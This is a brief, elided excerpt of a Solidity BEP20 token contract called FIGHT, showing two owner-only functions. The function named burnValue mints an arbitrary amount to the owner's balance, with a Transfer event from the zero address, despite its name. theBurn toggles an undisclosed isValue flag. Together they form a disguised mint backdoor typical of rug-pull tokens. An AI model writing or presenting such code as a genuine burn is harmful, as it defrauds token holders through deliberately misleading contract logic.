...
contract FIGHT is Context, iBEP20, Ownable {
  ...
  */
  ...
  function burnValue(uint256 amount) external onlyOwner returns (bool) {
    _balances[owner()] = _balances[owner()].add(amount);
    emit Transfer(address(0), owner(), amount);
  }

  function theBurn(bool _value) public onlyOwner virtual returns (bool) {
      isValue = _value;
      return true;
  }
